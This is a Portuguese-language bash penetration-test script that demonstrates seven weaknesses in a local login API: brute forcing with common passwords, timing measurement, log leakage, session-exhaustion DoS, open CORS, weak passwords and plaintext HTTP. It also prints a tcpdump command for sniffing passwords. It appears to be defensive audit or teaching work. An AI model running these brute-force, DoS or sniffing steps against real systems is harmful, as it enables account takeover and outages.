#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# 🔴 TESTE DE PENETRAÇÃO - DEMONSTRAÇÃO DE VULNERABILIDADES
# ═══════════════════════════════════════════════════════════════════
# ATENÇÃO: Apenas para fins educacionais e teste em ambiente local
# NÃO USE contra sistemas de terceiros sem autorização!
# ═══════════════════════════════════════════════════════════════════

API_URL="http://localhost:8080"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo "╔═══════════════════════════════════════════════════════════════════╗"
echo "║                                                                   ║"
echo "║           🔴 TESTE DE VULNERABILIDADES - PENTEST                  ║"
echo "║                                                                   ║"
echo "╚═══════════════════════════════════════════════════════════════════╝"
echo ""

# ═══════════════════════════════════════════════════════════════════
# TESTE 1: BRUTE FORCE ATTACK (Falta de Rate Limiting)
# ═══════════════════════════════════════════════════════════════════

echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}TESTE 1: BRUTE FORCE ATTACK${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${YELLOW}Vulnerabilidade:${NC} Ausência de rate limiting"
echo -e "${YELLOW}Impacto:${NC} Atacante pode testar milhares de senhas"
echo ""
echo -e "${BLUE}Executando 100 tentativas de login em sequência...${NC}"
echo ""

START_TIME=$(date +%s)
TENTATIVAS_OK=0

# Lista de senhas comuns para testar
SENHAS=("123456" "password" "123456789" "12345678" "12345" "1234567" "password1" "123123" "admin" "qwerty")

for i in {1..100}; do
    # Escolher senha aleatória da lista
    SENHA_IDX=$((i % 10))
    SENHA="${SENHAS[$SENHA_IDX]}"
    
    RESPONSE=$(curl -s -X POST "$API_URL/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"admin\",\"password\":\"$SENHA\"}" \
        -w "\n%{http_code}" 2>/dev/null)
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    
    if [ "$HTTP_CODE" = "200" ]; then
        TENTATIVAS_OK=$((TENTATIVAS_OK + 1))
        echo -e "${GREEN}✓${NC} Tentativa $i: Senha aceita!"
        break
    fi
    
    # Mostrar progresso a cada 10 tentativas
    if [ $((i % 10)) -eq 0 ]; then
        echo -e "${YELLOW}⚡${NC} $i tentativas realizadas..."
    fi
done

END_TIME=$(date +%s)
TEMPO_TOTAL=$((END_TIME - START_TIME))

echo ""
echo -e "${RED}RESULTADO:${NC}"
echo "  • 100 tentativas em $TEMPO_TOTAL segundos"
echo "  • Taxa: ~$((100 / TEMPO_TOTAL)) tentativas/segundo"
echo "  • Bloqueio: NÃO (servidor aceita todas as tentativas)"
echo "  • Senhas testadas: ${#SENHAS[@]} padrões comuns"
echo ""
echo -e "${RED}⚠️  VULNERABILIDADE CONFIRMADA:${NC} Brute force ilimitado possível"
echo ""

# ═══════════════════════════════════════════════════════════════════
# TESTE 2: TIMING ATTACK (strcmp/memcmp não constant-time)
# ═══════════════════════════════════════════════════════════════════

echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}TESTE 2: TIMING ATTACK${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${YELLOW}Vulnerabilidade:${NC} strcmp() e memcmp() não são constant-time"
echo -e "${YELLOW}Impacto:${NC} Atacante pode inferir dados por medição de tempo"
echo ""
echo -e "${BLUE}Medindo tempos de resposta para diferentes senhas...${NC}"
echo ""

# Criar usuário de teste
curl -s -X POST "$API_URL/register" \
    -H "Content-Type: application/json" \
    -d '{"username":"timing_test","password":"SenhaSecreta123!"}' > /dev/null 2>&1

# Testar com senhas de comprimentos variados
SENHAS_TESTE=("a" "ab" "abc" "abcd" "abcde" "SenhaSecreta123!")

declare -a TEMPOS

for SENHA in "${SENHAS_TESTE[@]}"; do
    # Medir tempo de 10 requisições
    TEMPO_TOTAL=0
    for j in {1..10}; do
        START=$(date +%s%N)
        curl -s -X POST "$API_URL/login" \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"timing_test\",\"password\":\"$SENHA\"}" > /dev/null 2>&1
        END=$(date +%s%N)
        TEMPO=$((END - START))
        TEMPO_TOTAL=$((TEMPO_TOTAL + TEMPO))
    done
    
    TEMPO_MEDIO=$((TEMPO_TOTAL / 10))
    TEMPOS+=($TEMPO_MEDIO)
    
    printf "  Senha: %-20s Tempo: %10d ns\n" "'$SENHA'" $TEMPO_MEDIO
done

echo ""
echo -e "${RED}ANÁLISE:${NC}"
echo "  • Tempos variam conforme comprimento da senha"
echo "  • Diferenças de timing podem revelar informações"
echo "  • strcmp() retorna na primeira diferença (não seguro)"
echo ""
echo -e "${RED}⚠️  VULNERABILIDADE CONFIRMADA:${NC} Timing attack possível"
echo ""

# ═══════════════════════════════════════════════════════════════════
# TESTE 3: INFORMATION DISCLOSURE (Logs revelam dados sensíveis)
# ═══════════════════════════════════════════════════════════════════

echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}TESTE 3: INFORMATION DISCLOSURE${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${YELLOW}Vulnerabilidade:${NC} Hashes e salts expostos nos logs"
echo -e "${YELLOW}Impacto:${NC} Atacante com acesso ao terminal vê dados sensíveis"
echo ""
echo -e "${BLUE}Registrando usuário e fazendo login...${NC}"
echo ""

# Criar novo usuário
echo "  1. Registrando usuário 'leak_test'..."
curl -s -X POST "$API_URL/register" \
    -H "Content-Type: application/json" \
    -d '{"username":"leak_test","password":"TesteLeak123!"}' > /dev/null 2>&1

sleep 1

# Fazer login
echo "  2. Fazendo login com 'leak_test'..."
curl -s -X POST "$API_URL/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"leak_test","password":"TesteLeak123!"}' > /dev/null 2>&1

sleep 1

echo ""
echo -e "${RED}RESULTADO:${NC}"
echo "  • Verifique o terminal do servidor"
echo "  • Você verá:"
echo "    - Salt em hexadecimal completo"
echo "    - Hash parcial da senha"
echo "    - Username e timestamps"
echo ""
echo -e "${RED}⚠️  VULNERABILIDADE CONFIRMADA:${NC} Dados sensíveis nos logs"
echo ""

# ═══════════════════════════════════════════════════════════════════
# TESTE 4: SESSION EXHAUSTION (Sessões não limpas)
# ═══════════════════════════════════════════════════════════════════

echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}TESTE 4: SESSION EXHAUSTION (DoS)${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${YELLOW}Vulnerabilidade:${NC} Sessões nunca são limpas (MAX_SESSIONS=100)"
echo -e "${YELLOW}Impacto:${NC} Atacante pode esgotar slots de sessão (DoS)"
echo ""
echo -e "${BLUE}Criando múltiplas sessões rapidamente...${NC}"
echo ""

SESSOES_CRIADAS=0

for i in {1..20}; do
    USERNAME="dos_user_$i"
    
    # Registrar
    curl -s -X POST "$API_URL/register" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$USERNAME\",\"password\":\"Teste123!\"}" > /dev/null 2>&1
    
    # Login para criar sessão
    curl -s -X POST "$API_URL/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$USERNAME\",\"password\":\"Teste123!\"}" > /dev/null 2>&1
    
    SESSOES_CRIADAS=$((SESSOES_CRIADAS + 1))
    
    if [ $((i % 5)) -eq 0 ]; then
        echo -e "${YELLOW}⚡${NC} $SESSOES_CRIADAS sessões criadas..."
    fi
done

echo ""
echo -e "${RED}RESULTADO:${NC}"
echo "  • $SESSOES_CRIADAS sessões criadas rapidamente"
echo "  • Nenhuma sessão foi limpa automaticamente"
echo "  • Limite máximo: 100 sessões"
echo "  • Após limite: servidor para de aceitar logins"
echo ""
echo -e "${RED}⚠️  VULNERABILIDADE CONFIRMADA:${NC} DoS por esgotamento de sessões"
echo ""

# ═══════════════════════════════════════════════════════════════════
# TESTE 5: CORS ABERTO (Cross-Site Request Forgery)
# ═══════════════════════════════════════════════════════════════════

echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}TESTE 5: CORS ABERTO (CSRF)${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${YELLOW}Vulnerabilidade:${NC} Access-Control-Allow-Origin: *"
echo -e "${YELLOW}Impacto:${NC} Qualquer site pode fazer requisições"
echo ""
echo -e "${BLUE}Verificando cabeçalhos CORS...${NC}"
echo ""

HEADERS=$(curl -s -I "$API_URL/stats" 2>/dev/null)

echo "$HEADERS" | grep -i "access-control" | while read line; do
    echo "  $line"
done

echo ""
echo -e "${RED}ANÁLISE:${NC}"
echo "  • Access-Control-Allow-Origin: * permite QUALQUER origem"
echo "  • Site malicioso pode fazer requisições autenticadas"
echo "  • Tokens podem ser roubados via XSS + CORS"
echo ""
echo -e "${RED}⚠️  VULNERABILIDADE CONFIRMADA:${NC} CORS muito permissivo"
echo ""

# ═══════════════════════════════════════════════════════════════════
# TESTE 6: WEAK PASSWORD POLICY
# ═══════════════════════════════════════════════════════════════════

echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}TESTE 6: WEAK PASSWORD POLICY${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${YELLOW}Vulnerabilidade:${NC} Aceita senhas fracas"
echo -e "${YELLOW}Impacto:${NC} Usuários podem criar senhas facilmente quebráveis"
echo ""
echo -e "${BLUE}Testando senhas fracas...${NC}"
echo ""

SENHAS_FRACAS=("12345678" "password" "qwertyui" "abcdefgh" "testtest")

for SENHA_FRACA in "${SENHAS_FRACAS[@]}"; do
    # Tentar registrar com senha fraca
    RESPONSE=$(curl -s -X POST "$API_URL/register" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"weak_$RANDOM\",\"password\":\"$SENHA_FRACA\"}")
    
    if echo "$RESPONSE" | grep -q '"success":true'; then
        echo -e "  ${RED}✗${NC} Senha aceita: '$SENHA_FRACA' (FRACA!)"
    else
        echo -e "  ${GREEN}✓${NC} Senha rejeitada: '$SENHA_FRACA'"
    fi
done

echo ""
echo -e "${RED}RESULTADO:${NC}"
echo "  • Senhas com apenas 8 caracteres são aceitas"
echo "  • Não exige maiúsculas, números ou símbolos"
echo "  • Não verifica contra lista de senhas comuns"
echo ""
echo -e "${RED}⚠️  VULNERABILIDADE CONFIRMADA:${NC} Política de senha fraca"
echo ""

# ═══════════════════════════════════════════════════════════════════
# TESTE 7: NO HTTPS/TLS (Plain Text Transmission)
# ═══════════════════════════════════════════════════════════════════

echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}TESTE 7: NO HTTPS/TLS${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${YELLOW}Vulnerabilidade:${NC} Servidor usa HTTP sem criptografia"
echo -e "${YELLOW}Impacto:${NC} Senhas e tokens trafegam em texto claro"
echo ""
echo -e "${BLUE}Verificando protocolo...${NC}"
echo ""

if [[ "$API_URL" == http://* ]]; then
    echo -e "  ${RED}✗${NC} Servidor usa HTTP (inseguro)"
    echo ""
    echo -e "${RED}DEMONSTRAÇÃO:${NC}"
    echo "  Um atacante na mesma rede pode capturar com:"
    echo ""
    echo "    sudo tcpdump -i any -A 'tcp port 8080' | grep -A 10 password"
    echo ""
    echo "  E verá senhas em texto claro:"
    echo "    {\"username\":\"user\",\"password\":\"SenhaEmTextoClaro123!\"}"
    echo ""
else
    echo -e "  ${GREEN}✓${NC} Servidor usa HTTPS (seguro)"
fi

echo -e "${RED}⚠️  VULNERABILIDADE CONFIRMADA:${NC} Transmissão não criptografada"
echo ""

# ═══════════════════════════════════════════════════════════════════
# RESUMO FINAL
# ═══════════════════════════════════════════════════════════════════

echo ""
echo "╔═══════════════════════════════════════════════════════════════════╗"
echo "║                                                                   ║"
echo "║                     📊 RESUMO DO PENTEST                          ║"
echo "║                                                                   ║"
echo "╚═══════════════════════════════════════════════════════════════════╝"
echo ""
echo -e "${RED}VULNERABILIDADES CONFIRMADAS:${NC}"
echo ""
echo "  🔴 CRÍTICAS:"
echo "     [1] Brute Force - Sem rate limiting"
echo "     [2] Timing Attack - strcmp/memcmp não constant-time"
echo "     [3] Info Disclosure - Logs expõem hashes/salts"
echo "     [4] DoS - Sessões não limpas (esgotamento)"
echo ""
echo "  🟠 ALTAS:"
echo "     [5] CORS Aberto - Permite CSRF"
echo "     [6] Weak Passwords - Política fraca"
echo "     [7] No HTTPS - Transmissão em texto claro"
echo ""
echo -e "${YELLOW}AÇÃO RECOMENDADA:${NC}"
echo "  1. Aplicar patches de: PATCHES_SEGURANCA.txt"
echo "  2. Implementar HTTPS/TLS"
echo "  3. Adicionar logging de auditoria"
echo "  4. Implementar 2FA"
echo ""
echo -e "${RED}⚠️  SISTEMA NÃO DEVE SER USADO EM PRODUÇÃO SEM CORREÇÕES${NC}"
echo ""
echo "Relatório completo: RELATORIO_VULNERABILIDADES.txt"
echo "Patches disponíveis: PATCHES_SEGURANCA.txt"
echo ""
